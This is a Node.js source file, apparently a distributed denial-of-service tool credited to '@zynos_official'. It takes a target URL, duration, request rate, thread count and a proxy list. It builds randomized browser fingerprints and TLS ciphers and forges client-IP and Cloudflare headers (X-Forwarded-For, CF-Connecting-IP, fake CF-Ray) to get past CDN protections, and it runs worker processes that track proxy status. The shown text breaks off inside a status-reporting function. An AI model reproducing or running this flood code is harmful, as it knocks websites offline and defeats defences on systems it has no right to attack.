const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const colors = require('colors');
const os = require("os");

const errorHandler = error => {};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 7) {
    console.log(`@zynos_official Usage: target time rate thread proxyfile`);
    process.exit();
}

const headers = {};

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "abcdefghijklmnopqrstuvwxyz";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function randstrs(length) {
    const characters = "0123456789";
    const randomBytes = crypto.randomBytes(length);
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(randomBytes[i] % characters.length);
    }
    return result;
}

const ip_spoof = () => {
    const getRandomByte = () => Math.floor(Math.random() * 255);
    return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
};

const spoofed = ip_spoof();

const ip_spoof2 = () => {
    const getRandomByte = () => Math.floor(Math.random() * 2500);
    return `${getRandomByte()}`;
};

const spoofed2 = ip_spoof2();

function getRandomDate(start = new Date(2000, 0, 1), end = new Date()) {
    return new Date(start.getTime() + Math.random() * (end.getTime() - start.getTime()));
}

const ip_spoof3 = () => {
    const getRandomByte = () => Math.floor(Math.random() * 99);
    return `${getRandomByte()}`;
};

const spoofed3 = ip_spoof3();

const ip_spoof4 = () => {
    const getRandomByte = () => Math.floor(Math.random() * 9);
    return `${getRandomByte()}`;
};

const spoofed4 = ip_spoof4();

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6],
};

function generateRandomPriority() {
    return Math.floor(Math.random() * 256);
}

const randomPriorityValue = generateRandomPriority();

function generateRandomString(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join('');
}

const sig = [
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
];

const cplist = [
    "TLS_AES_128_CCM_8_SHA256",
    "TLS_AES_128_CCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_AES_128_GCM_SHA256"
];

const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
    'text/html; charset=utf-8',
    'application/json, text/plain, */*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
];

const lang_header = [
    'ko-KR', 'en-US', 'zh-CN', 'zh-TW', 'ja-JP', 'en-GB', 'en-AU',
    'en-GB,en-US;q=0.9,en;q=0.8', 'en-GB,en;q=0.5', 'en-CA',
    'en-UK, en, de;q=0.5', 'en-NZ', 'en-GB,en;q=0.6', 'en-ZA',
    'en-IN', 'en-PH', 'en-SG', 'en-HK', 'en-GB,en;q=0.8',
    'en-GB,en;q=0.9', ' en-GB,en;q=0.7', '*', 'en-US,en;q=0.5',
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'utf-8, iso-8859-1;q=0.5, *;q=0.1', 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-GB, en-US, en;q=0.9', 'de-AT, de-DE;q=0.9, en;q=0.5',
    'cs;q=0.5', 'da, en-gb;q=0.8, en;q=0.7', 'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'en-US,en;q=0.9', 'de-CH;q=0.7', 'tr', 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
];

const encoding_header = [
    '*', '*/*', 'gzip', 'gzip, deflate, br', 'compress, gzip',
    'deflate, gzip', 'gzip, identity', 'gzip, deflate', 'br',
    'br;q=1.0, gzip;q=0.8, *;q=0.1', 'gzip;q=1.0, identity; q=0.5, *;q=0',
    'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
    'compress;q=0.5, gzip;q=1.0', 'identity', 'gzip, compress',
    'compress, deflate', 'compress', 'gzip, deflate, br', 'deflate',
    'gzip, deflate, lzma, sdch', 'deflate'
];

const control_header = [
    'max-age=604800', 'proxy-revalidate', 'public, max-age=0',
    'max-age=315360000', 'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
    's-maxage=604800', 'max-stale', 'public, immutable, max-age=31536000',
    'must-revalidate', 'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
    'max-age=31536000,public,immutable', 'max-age=31536000,public',
    'min-fresh', 'private', 'public', 's-maxage', 'no-cache',
    'no-cache, no-transform', 'max-age=2592000', 'no-store',
    'no-transform', 'max-age=31557600', 'stale-if-error',
    'only-if-cached', 'max-age=0'
];

const nm = ["110.0.0.0", "111.0.0.0", "112.0.0.0", "113.0.0.0", "114.0.0.0", "115.0.0.0", "116.0.0.0", "117.0.0.0", "118.0.0.0", "119.0.0.0"];
const nmx = ["120.0", "119.0", "118.0", "117.0", "116.0", "115.0", "114.0", "113.0", "112.0", "111.0"];
const nmx1 = ["105.0.0.0", "104.0.0.0", "103.0.0.0", "102.0.0.0", "101.0.0.0", "100.0.0.0", "99.0.0.0", "98.0.0.0", "97.0.0.0"];

const sysos = [
    "Windows 1.01", "Windows 1.02", "Windows 1.03", "Windows 1.04",
    "Windows 2.01", "Windows 3.0", "Windows NT 3.1", "Windows NT 3.5",
    "Windows 95", "Windows 98", "Windows 2006", "Windows NT 4.0",
    "Windows 95 Edition", "Windows 98 Edition", "Windows Me",
    "Windows Business", "Windows XP", "Windows 7", "Windows 8",
    "Windows 10 version 1507", "Windows 10 version 1511",
    "Windows 10 version 1607", "Windows 10 version 1703"
];

const winarch = [
    "x86-16", "x86-16, IA32", "IA-32", "IA-32, Alpha, MIPS",
    "IA-32, Alpha, MIPS, PowerPC", "Itanium", "x86_64",
    "IA-32, x86-64", "IA-32, x86-64, ARM64", "x86-64, ARM64",
    "ARMv4, MIPS, SH-3", "ARMv4", "ARMv5", "ARMv7",
    "IA-32, x86-64, Itanium", "IA-32, x86-64, Itanium", "x86-64, Itanium"
];

const winch = [
    "2012 R2", "2019 R2", "2012 R2 Datacenter", "Server Blue",
    "Longhorn Server", "Whistler Server", "Shell Release",
    "Daytona", "Razzle", "HPC 2008"
];

var nm1 = nm[Math.floor(Math.random() * nm.length)];
var nm2 = sysos[Math.floor(Math.random() * sysos.length)];
var nm3 = winarch[Math.floor(Math.random() * winarch.length)];
var nm4 = nmx[Math.floor(Math.random() * nmx.length)];
var nm5 = winch[Math.floor(Math.random() * winch.length)];
var nm6 = nmx1[Math.floor(Math.random() * nmx1.length)];

const uap = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/134.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/135.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:134.0) Gecko/20100101 Firefox/134.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0",
  generateRandomString(3, 8) + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + nm1 + " Safari/537.36 Edg/" + nm1,
  generateRandomString(3, 8) + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + "; rv:" + nm4 + ") Gecko/20100101 Firefox/" + nm4,
  generateRandomString(3, 8) + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + nm1 + " Safari/537.36",
  generateRandomString(3, 8) + "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + ")) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + nm1 + " Safari/537.36 OPR/" + nm6
];

const refers = [
    'https://www.google.com', 'https://www.facebook.com', 'https://www.twitter.com',
    'https://www.youtube.com', 'https://www.amazon.com', 'https://www.netflix.com',
    'https://www.instagram.com', 'https://www.yahoo.com', 'https://www.stackoverflow.com',
    'https://www.github.com', 'https://www.linkedin.com', 'https://www.cnn.com',
    'https://www.apple.com', 'https://www.microsoft.com', 'https://www.wikipedia.org',
    'https://www.nytimes.com', 'https://www.msn.com', 'https://www.reddit.com',
    'https://www.quora.com', 'https://www.npr.org', 'https://www.bbc.com',
    'https://www.theguardian.com', 'https://www.huffingtonpost.com', 'https://www.washingtonpost.com',
    'https://www.wsj.com', 'https://www.bloomberg.com', 'https://www.cnbc.com',
    'https://www.merriam-webster.com', 'https://www.dictionary.com', 'https://www.thedailybeast.com',
    'https://www.thedailyshow.com', 'https://www.colbertnation.com', 'https://www.nationalgeographic.com',
    'https://www.nasa.gov', 'https://www.nypl.org', 'https://www.britannica.com',
    'https://www.healthline.com', 'https://www.webmd.com', 'https://www.mayoclinic.org',
    'https://www.cdc.gov', 'https://www.nih.gov', 'https://www.medlineplus.gov',
    'https://www.cancer.gov', 'https://www.fda.gov', 'https://www.nature.com',
    'https://www.sciencemag.org', 'https://www.scientificamerican.com', 'https://www.who.int',
    'https://www.un.org', 'https://www.worldbank.org', 'https://www.imf.org',
    'https://www.wto.org', 'https://www.oecd.org', 'https://www.europa.eu',
    'https://www.nato.int', 'https://www.icrc.org', 'https://www.amnesty.org',
    'https://www.hrw.org', 'https://www.greenpeace.org', 'https://www.oxfam.org',
    'https://www.doctorswithoutborders.org', 'https://www.unicef.org', 'https://www.savethechildren.org',
    'https://www.redcross.org', 'https://www.wikipedia.org', 'https://www.wikimedia.org',
    'https://www.mozilla.org', 'https://www.apache.org', 'https://www.mysql.com',
    'https://www.php.net', 'https://www.python.org', 'https://www.ruby-lang.org',
    'https://www.jquery.com', 'https://www.reactjs.org', 'https://www.angularjs.org',
    'https://www.vuejs.org', 'https://www.bootstrap.com', 'https://www.materializecss.com',
    'https://www.sass-lang.com', 'https://www.lesscss.org', 'https://www.d3js.org',
    'https://www.highcharts.com', 'https://www.chartjs.org', 'https://www.mapbox.com',
    'https://www.mapboxgl-js.com', 'https://www.openstreetmap.org', 'https://www.mapbox.com',
    'https://www.mapboxgl-js.com', 'https://www.chartjs.org', 'https://www.highcharts.com',
    'https://www.d3js.org', 'https://www.lesscss.org', 'https://www.sass-lang.com',
    'https://www.materializecss.com', 'https://www.bootstrap.com', 'https://www.vuejs.org',
    'https://www.angularjs.org', 'https://www.reactjs.org', 'https://www.jquery.com',
    'https://www.ruby-lang.org', 'https://www.python.org', 'https://www.php.net',
    'https://www.mysql.com', 'https://www.apache.org', 'https://www.mozilla.org',
    'https://www.wikimedia.org', 'https://www.wikipedia.org', 'https://www.redcross.org',
    'https://www.savethechildren.org', 'https://www.unicef.org', 'https://www.doctorswithoutborders.org',
    'https://www.oxfam.org', 'https://www.greenpeace.org', 'https://www.hrw.org',
    'https://www.amnesty.org', 'https://www.icrc.org', 'https://www.nato.int',
    'https://www.europa.eu', 'https://www.oecd.org', 'https://www.wto.org',
    'https://www.imf.org', 'https://www.worldbank.org', 'https://www.un.org',
    'https://www.who.int', 'https://www.scientificamerican.com', 'https://www.sciencemag.org',
    'https://www.nature.com', 'https://www.fda.gov', 'https://www.cancer.gov',
    'https://www.medlineplus.gov', 'https://www.nih.gov', 'https://www.cdc.gov',
    'https://www.mayoclinic.org', 'https://www.webmd.com', 'https://www.healthline.com',
    'https://www.britannica.com', 'https://www.nypl.org', 'https://www.nasa.gov',
    'https://www.nationalgeographic.com', 'https://www.colbertnation.com', 'https://www.thedailyshow.com',
    'https://www.thedailybeast.com', 'https://www.dictionary.com', 'https://www.merriam-webster.com',
    'https://www.cnbc.com', 'https://www.bloomberg.com', 'https://www.wsj.com',
    'https://www.washingtonpost.com', 'https://www.huffingtonpost.com', 'https://www.theguardian.com',
    'https://www.bbc.com', 'https://www.npr.org', 'https://www.quora.com',
    'https://www.reddit.com', 'https://www.msn.com', 'https://www.nytimes.com',
    'https://www.wikipedia.org', 'https://www.microsoft.com', 'https://www.apple.com',
    'https://www.cnn.com', 'https://www.linkedin.com', 'https://www.github.com',
    'https://www.stackoverflow.com', 'https://www.yahoo.com', 'https://www.instagram.com',
    'https://www.netflix.com', 'https://www.amazon.com', 'https://www.youtube.com',
    'https://www.twitter.com', 'https://www.facebook.com', 'https://www.google.com'
];

const platformd = ["Windows", "Linux", "Android", "iOS", "Mac OS", "iPadOS", "BlackBerry OS", "Firefox OS"];
const rdom2 = ["hello server", "hello cloudflare", "hello client", "hello world", "hello akamai", "hello cdnfly", "hello kitty"];
const dest = ['document', 'image', 'embed', 'empty', 'frame'];

const patch = [
    'application/json-patch+json', 'application/xml-patch+xml',
    'application/merge-patch+json', 'application/vnd.github.v3+json',
    'application/vnd.mozilla.xul+xml', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    'application/vnd.oasis.opendocument.text', 'application/vnd.sun.xml.writer',
    'text/x-diff', 'text/x-patch'
];

const jalist = [
 "002205d0f96c37c5e660b9f041363c1",
 "073eede15b2a5a0302d823ecbd5ad15b",
 "0b61c673ee71fe9ee725bd687c455809",
 "6cd1b944f5885e2cfbe98a840b75eeb8",
 "94c485bca29d5392be53f2b8cf7f4304",
 "b4f4e6164f938870486578536fc1ffce",
 "b8f81673c0e1d29908346f3bab892b9b",
 "baaac9b6bf25ad098115c71c59d29e51",
 "bc6c386f480ee97b9d9e52d472b772d8",
 "da949afd9bd6df820730f8f171584a71",
 "f58966d34ff9488a83797b55c804724d",
 "fd6314b03413399e4f23d1524d206692",
 "0a81538cf247c104edb677bdb8902ed5",
 "0b6592fd91d4843c823b75e49b43838d",
 "0ffee3ba8e615ad22535e7f771690a28",
 "1c15aca4a38bad90f9c40678f6aface9",
 "5163bc7c08f57077bc652ec370459c2f",
 "a88f1426c4603f2a8cd8bb41e875cb75",
 "b03910cc6de801d2fcfa0c3b9f397df4",
 "bfcc1a3891601edb4f137ab7ab25b840",
 "ce694315cbb81ce95e6ae4ae8cbafde6",
 "f15797a734d0b4f171a86fd35c9a5e43"
];

const referrer_policy = [
    'strict-origin-when-cross-origin',
    'no-referrer-when-downgrade',
    'same-origin',
    'origin',
    'strict-origin',
    'unsafe-url',
    'no-referrer',
    'origin-when-cross-origin',
];

const cf_ray_prefixes = [
    "8a0a092ad9d940b0",
    "8a0a092ad9d940b1",
    "8a0a092ad9d940b2",
];

const cf_ray_locations = ['SIN', 'JAK', 'CGK', 'LAX', 'FRA', 'LHR'];

const countries = [
    "ID", "SG", "MY", "PH", "TH", "VN", "CN", "JP", "KR", "IN",
    "PK", "BD", "NP", "LK", "KH", "LA", "MM", "TW", "HK", "MO",
    "GB", "DE", "FR", "IT", "ES", "NL", "SE", "NO", "DK", "FI",
    "PL", "CZ", "HU", "AT", "CH", "BE", "PT", "IE", "GR", "RU",
    "US", "CA", "MX", "BR", "AR", "CL", "CO", "PE", "VE", "EC",
    "BO", "PY", "UY", "CR", "PA", "GT", "HN", "SV", "NI", "DO",
    "ZA", "NG", "EG", "KE", "MA", "DZ", "TN", "GH", "CI", "CM",
    "AU", "NZ", "FJ", "PG", "SB", "VU", "WS", "TO", "FM", "MH",
];

const uaa = [
    '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    '"Google Chrome";v="118", "Chromium";v="118", "Not?A_Brand";v="99"',
    '"Google Chrome";v="117", "Chromium";v="117", "Not?A_Brand";v="16"',
    '"Google Chrome";v="116", "Chromium";v="116", "Not?A_Brand";v="8"',
    '"Google Chrome";v="115", "Chromium";v="115", "Not?A_Brand";v="99"',
    '"Google Chrome";v="118", "Chromium";v="118", "Not?A_Brand";v="24"',
    '"Google Chrome";v="117", "Chromium";v="117", "Not?A_Brand";v="24"'
];

const pua = ["Linux", "Windows", "Mac OS"];
const nua = ["SA/3 Mobile", "Mobile", "Mobile Windows"];
const site = ['cross-site', 'same-origin', 'same-site', 'none'];
const langua = ["; en-US", "; ko-KR", "; en-US", "; zh-CN", "; zh-TW", "; ja-JP", "; en-GB", "; en-AU", "; en-CA", "; en-NZ", "; en-ZA", "; en-IN", "; en-PH", "; en-SG", "; en-HK"];

const FA = ['Amicable', 'Benevolent', 'Cacophony', 'Debilitate', 'Ephemeral', 'Furtive', 'Garrulous', 'Harangue', 'Ineffable', 'Juxtapose', 'Kowtow', 'Labyrinthine', 'Mellifluous', 'Nebulous', 'Obfuscate', 'Pernicious', 'Quixotic', 'Rambunctious', 'Salient', 'Taciturn', 'Ubiquitous', 'Vexatious', 'Wane', 'Xenophobe', 'Yearn', 'Zealot', 'Alacrity', 'Belligerent', 'Conundrum', 'Deliberate', 'Facetious', 'Gregarious', 'Harmony', 'Insidious', 'Jubilant', 'Kaleidoscope', 'Luminous', 'Meticulous', 'Nefarious', 'Opulent', 'Prolific', 'Quagmire', 'Resilient', 'Serendipity', 'Tranquil', 'Ubiquity', 'Voracious', 'Whimsical'];

const FAB = ['Aberration', 'Benevolence', 'Catalyst', 'Dichotomy', 'Ephemeral', 'Fecund', 'Garrulous', 'Harmony', 'Ineffable', 'Juxtapose', 'Kindle', 'Labyrinthine', 'Mirthful', 'Nebulous', 'Obfuscate', 'Pernicious', 'Quintessential', 'Rambunctious', 'Surreptitious', 'Tangible', 'Ubiquitous', 'Vicarious', 'Whimsical', 'Xenial', 'Yonder', 'Zephyr', 'Allure', 'Benevolent', 'Cacophony', 'Dulcet', 'Enigmatic', 'Fervor', 'Gregarious', 'Halcyon', 'Ineffable', 'Jubilant', 'Kaleidoscope', 'Luminous', 'Mellifluous', 'Nefarious', 'Opulent', 'Prolific', 'Quixotic', 'Resilient', 'Serenity', 'Tranquil', 'Unabashed', 'Voracious', 'Wanderlust', 'Xenophile', 'Yearning', 'Zestful'];

const mad = ['Amicable', 'Benevolent', 'Cacophony', 'Debilitate', 'Ephemeral', 'Furtive', 'Garrulous', 'Harangue', 'Ineffable', 'Juxtapose', 'Kowtow', 'Labyrinthine', 'Mellifluous', 'Nebulous', 'Obfuscate', 'Pernicious', 'Quixotic', 'Rambunctious', 'Salient', 'Taciturn', 'Ubiquitous', 'Vexatious', 'Wane', 'Xenophobe', 'Yearn', 'Zealot', 'Alacrity', 'Belligerent', 'Conundrum', 'Deliberate', 'Facetious', 'Gregarious', 'Harmony', 'Insidious', 'Jubilant', 'Kaleidoscope', 'Luminous', 'Meticulous', 'Nefarious', 'Opulent', 'Prolific', 'Quagmire', 'Resilient', 'Serendipity', 'Tranquil', 'Ubiquity', 'Voracious', 'Whimsical'];

function generateCFRay() {
    const prefix = randomElement(cf_ray_prefixes);
    const loc = randomElement(cf_ray_locations);
    return `${prefix}-${loc}`;
}

var FA1 = FA[Math.floor(Math.random() * FA.length)];
var FAB1 = FAB[Math.floor(Math.random() * FAB.length)];
var cipper = cplist[Math.floor(Math.random() * cplist.length)];
var nua1 = nua[Math.floor(Math.random() * nua.length)];
var mad1 = mad[Math.floor(Math.random() * mad.length)];
var langua1 = langua[Math.floor(Math.random() * langua.length)];
var random = rdom2[Math.floor(Math.random() * rdom2.length)];
var patched = patch[Math.floor(Math.random() * patch.length)];
var platformx = platformd[Math.floor(Math.random() * platformd.length)];
var uaas = uaa[Math.floor(Math.random() * uaa.length)];
var puaa = pua[Math.floor(Math.random() * pua.length)];
var siga = sig[Math.floor(Math.random() * sig.length)];
var uap1 = uap[Math.floor(Math.random() * uap.length)];
var dest1 = dest[Math.floor(Math.random() * dest.length)];
var site1 = site[Math.floor(Math.random() * site.length)];
var accept = accept_header[Math.floor(Math.random() * accept_header.length)];
var Ref = refers[Math.floor(Math.random() * refers.length)];
var lang = lang_header[Math.floor(Math.random() * lang_header.length)];
var policy = referrer_policy[Math.floor(Math.floor(Math.random() * referrer_policy.length))];
var encoding = encoding_header[Math.floor(Math.random() * encoding_header.length)];
var control = control_header[Math.floor(Math.random() * control_header.length)];
var jar = jalist[Math.floor(Math.floor(Math.random() * jalist.length))];
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
var multi = { [FA1 + "-" + FAB1]: mad1 + "-" + generateRandomString(4, 25) };
var multi2 = FAB1 + "-" + FA1 + ": " + mad1 + "-" + generateRandomString(4, 16);

const spoofHeaders = [
    { "X-Forwarded-For": ip_spoof() },
    { "X-Forwarded-Host": parsedTarget.host },
    { "X-Forwarded-Scheme": "https" },
    { "X-Real-IP": ip_spoof() },
    { "X-Remote-IP": ip_spoof() },
    { "X-Remote-Addr": ip_spoof() },
    { "X-Client-IP": ip_spoof() },
    { "X-Originating-IP": ip_spoof() },
    { "X-Host": parsedTarget.host },
    { "ja3": jar },
    { "referrer-policy": policy },
    { "X-Original-URL": "/" + generateRandomString(5, 15) + "?" + generateRandomString(3, 8) + "=" + generateRandomString(4, 10) },
    { "X-Forwarded-Port": "443" },
    { "X-Cache-Status": "HIT" },
    { "source-ip": randstr(5) },
    { "cluster-ip": randstr(5)  },
    { "Vary" : randstr(5) },
    { "CF-Visitor": '{"scheme":"https"}' },
    { "CF-Worker": "true" },
    { "CDN-Loop": "cloudflare" },
    { "CF-Connecting-IP": ip_spoof() },
    { "CF-Ray": generateCFRay() },
    { "CF-IPCountry": randomElement(countries) },    
    { "True-Client-IP": ip_spoof() },
    { "Via": "1.1" + ip_spoof() + " (squid/3.5.27)" }
];

const rateHeaders = [
    { "cookie": "cf-clearance=" + generateRandomString(16, 64) },
    { "origin": "https://" + parsedTarget.host + "/" },
    { "x-requested-with": "XMLHttpRequest" },
    { "cache-control": "private" },
    { "Expect-CT": "99-OK" }
];

const rateHeaders2 = [
    { "accept-char": "UTF-8" },
    { "Geo-Location": "UNKNOWN" },
    { "X-Forwarded-For": spoofed },
    { "Width": "1920" }
];

const rateHeaders3 = [
    { "devxice-memory": "0.3" },
    { "eaccept-languagep": lang },
    { "X-drequested-withp": "XMLHttpRequest" },
    { "Viecwport-widthp": "1080" }
];

const rateHeaders4 = [
    { "Maxw-Forwardsp": "5" },
    { "prawgmap": "no-cache" },
    { "Sewc-ch-uwa-Archp": "Private" },
    { "Seac-Gpxcp": "1" }
];

const rateHeaders5 = [
    { "X-Forwarded-For": spoofed },
    { "source-ip" : randstr(5) },
    { "Vary" : randstr(5) },
    { "Attribution-Reporting-Eligible" : "trigger" }
];

const rateHeaders6 = [
    { "TTL-3": "1.5" },
    { "From-unknown-Botnet" : "mirai" }
];

const rateHeaders7 = [
    { "A-IM": "Feed" },
    { "dnt" : 1 },
    { "content-security-policy-report-only": "report-uri https://reporting.go-mpulse.net/report/FDSGP-LEB9B-T8Y2A-5V5ED-9WX2T" }
];

const rateHeaders8 = [
    { "Service-Worker-Navigation-Preload" : "true" },
    { "Supports-Loading-Mode" : "credentialed-prerender" },
    { "pragma": "no-cache" },
    { "data-return" : "false"}
];

const MAX_RAM_PERCENTAGE = 80;
const RESTART_DELAY = 1000;

if (cluster.isMaster) {
    console.clear();
    console.log(`Methods Blast by: @zynos_official`.rainbow);
    console.log(`--------------------------------------------`.gray);
    console.log(`Target: `.brightYellow + process.argv[2]);
    console.log(`Time: `.brightYellow + process.argv[3]);
    console.log(`Rate: `.brightYellow + process.argv[4]);
    console.log(`Thread: `.brightYellow + process.argv[5]);
    console.log(`ProxyFile: `.brightYellow + process.argv[6]);
    console.log(`--------------------------------------------`.gray);
    console.log(`Note: Don't Sell My Methods`.brightCyan);

    // ========== TAMBAHAN STATUS PROXY + RESPONSE CODE ==========
    const proxyStatus = new Map(); // key: "ip:port", value: { status, requests, lastCode, lastResponse }

    function updateProxyStatus(proxyAddr, isActive, responseCode = null) {
        const key = proxyAddr;
        if (!proxyStatus.has(key)) {
            proxyStatus.set(key, { 
                status: isActive ? 'aktif' : 'mati', 
                requests: 0,
                lastCode: responseCode,
                lastResponse: responseCode ? getStatusText(responseCode) : ''
            });
        } else {
            const data = proxyStatus.get(key);
            data.status = isActive ? 'aktif' : 'mati';
            if (isActive && responseCode) {
                data.requests += 1;
                data.lastCode = responseCode;
                data.lastResponse = getStatusText(responseCode);
            }
            proxyStatus.set(key, data);
        }
    }

    function getStatusText(code) {
        const statusMap = {
            200: 'OK',
            201: 'Created',
            202: 'Accepted',
            204: 'No Content',
            301: 'Moved Permanently',
            302: 'Found',
            304: 'Not Modified',
            400: 'Bad Request',
            401: 'Unauthorized',
            403: 'Forbidden',
            404: 'Not Found',
            405: 'Method Not Allowed',
            429: 'Too Many Requests',
            500: 'Internal Server Error',
            501: 'Not Implemented',
            502: 'Bad Gateway',
            503: 'Service Unavailable',
            504: 'Gateway Timeout',
            505: 'HTTP Version Not Supported'
        };
        return statusMap[code] || 'Unknown';
    }

    function getStatusColor(code) {
        if (code === 200 || code === 201 || code === 202 || code === 204) return 'green';
        if (code >= 300 && code < 400) return 'yellow';
        if (code >= 400 && code < 500) return 'red';
